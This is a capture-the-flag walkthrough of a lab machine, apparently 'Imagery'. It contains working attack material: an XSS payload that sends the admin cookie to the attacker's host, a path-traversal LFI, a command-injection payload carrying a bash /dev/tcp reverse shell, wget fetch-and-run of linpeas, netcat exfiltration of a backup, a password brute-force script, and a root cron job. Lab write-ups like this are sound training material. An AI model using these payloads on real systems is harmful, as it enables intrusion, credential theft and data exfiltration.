## Reconnaissance

Start by using `nmap` to identify open ports and services on the target machine.

```bash
sudo nmap -sS -sV -A <target_ip>
```

We find a web service running on port 8000.

## Catch admin cookie via XSS

After navigating to the web application on port 8000, we create an account and log in. Once authenticated, we test image upload but do not find an obvious injection point.
We can submit a bug report to the admin, so we try an XSS payload there.

```
<img src=1 onerror="document.location='http://<source_ip>/'+document.cookie">
```

> Make sure to use your local IP address in place of `<source_ip>`, because non-local IP addresses are filtered.

Use a simple HTTP server to capture the cookie:

```bash
sudo python3 -m http.server 80
```

This gives us the admin cookie.

## Arbitrary File Read via LFI

We identify an LFI in `/admin/get_system_log?log_identifier=`. We can read files such as `http://<target_ip>:8000/admin/get_system_log?log_identifier=../../../../../../../home/web/web/db.json`.

From this, we learn the machine has a `web` user with home directory `/home/web/`.
With `ffuf`, we discover `/home/web/web/` and enumerate Python files in that directory.

```bash
ffuf -u 'http://<target_ip>:8000/admin/get_system_log?log_identifier=../../../../../../../home/web/web/FUZZ.py' -w common.txt -b 'session=<admin_cookie>'
```

We find `config.py`, which contains the database path (`db.json`).

Inside it, we recover the password hash for `testuser@imagery.htb` and crack it with `hashcat`.

```bash
hashcat -m 0 hash.txt rockyou.txt
```

## Reverse shell via Command Injection

Now we can log in as `testuser@imagery.htb`. In `api_edit.py`, we find endpoint `/apply_visual_transform`, which edits images by applying transformations. The `x`, `y`, `width`, and `height` parameters are vulnerable to command injection.

```python
command = f"{IMAGEMAGICK_CONVERT_PATH} {original_filepath} -crop {width}x{height}+{x}+{y} {output_filepath}"
subprocess.run(command, capture_output=True, text=True, shell=True, check=True)
```

So we can use a payload to obtain a reverse shell.

```json
{
  "imageId": "7fd8561e-8e38-4cc6-8190-decfced1a469",
  "transformType": "crop",
  "params": {
    "x": "1",
    "y": "2 /tmp/toto;/bin/bash -c \"/bin/bash -i >& /dev/tcp/10.10.15.94/4444 0>&1\" ;",
    "width": 1,
    "height": 1
  }
}
```

Send the request with `curl`:

```bash
curl -v -X POST http://<target_ip>:8000/apply_visual_transform --cookie 'session=<admin_cookie>' --data-binary @payload.json -H 'Content-Type: application/json'
```

> `payload.json` contains the JSON payload above.

With Netcat listening on port 4444:

```bash
nc -lvnp 4444
```

We get a reverse shell as user `web`.

## Pivot to mark

We can use `linpeas.sh` to find potential vulnerabilities. Use a Python HTTP server and `wget` to transfer `linpeas.sh` to the target.

Attacker side:
```bash
sudo python3 -m http.server 80
```

Target side:
```bash
wget http://<source_ip>/linpeas.sh -O /tmp/linpeas.sh && chmod +x /tmp/linpeas.sh && /tmp/linpeas.sh
```

We find `/var/backup/web_20250806_120723.zip.aes`, which looks like a backup of the `web` user home directory. It is encrypted with `aes-256-cbc`.

We first exfiltrate this file with Netcat.

Attacker side:
```bash
nc -lvnp 1234 > web_backup.aes
```

Target side:
```bash
nc <source_ip> 1234 < /var/backup/web_20250806_120723.zip.aes
```

We can use the Python library `pyAesCrypt` and the `rockyou.txt` wordlist to decrypt it.

Use this script to decrypt the file:
```python
import pyAesCrypt
f = open('rockyou.txt', 'r', encoding='ISO-8859-1')
lines = f.readlines()

if __name__ == "__main__":
    for line in lines:
        password = line.strip()
        try:
            pyAesCrypt.decryptFile("web_20250806_120723.zip.aes", "web_20250806_120723.zip", password)
            print(f"Password is: {password}")
            break
        except:
            print(f"Trying password: {password} - Failed")
            continue
    f.close()
```

We recover the password and decrypt the file. After extracting the ZIP archive, we find `db.json` with the password hash for user `mark`. We crack it with `hashcat` using the same approach as before.

## Privilege Escalation to root
We can switch to `mark` with `su`, then run `sudo -l` to check allowed root commands. `mark` can run `charcol` as root without a password. `charcol` is a file encryption/decryption tool.

We can reset the password of `charcol` by using this command:

```bash
sudo charcol -R
```

Now we can use the `charcol` shell.
Inside it, we find we can create a cron job that runs as root.
I tried to create a cron job to get a reverse shell but it didn't work.
So I copy the flag to `/tmp/`, which is world-writable, and read it from there.

Use this command inside charcol shell:
```bash
auto add --schedule "* * * * *" --command "cp /root/root.txt /tmp/root.txt; chmod 777 /tmp/root.txt" --name "cp"
```

Now we can read the root flag.
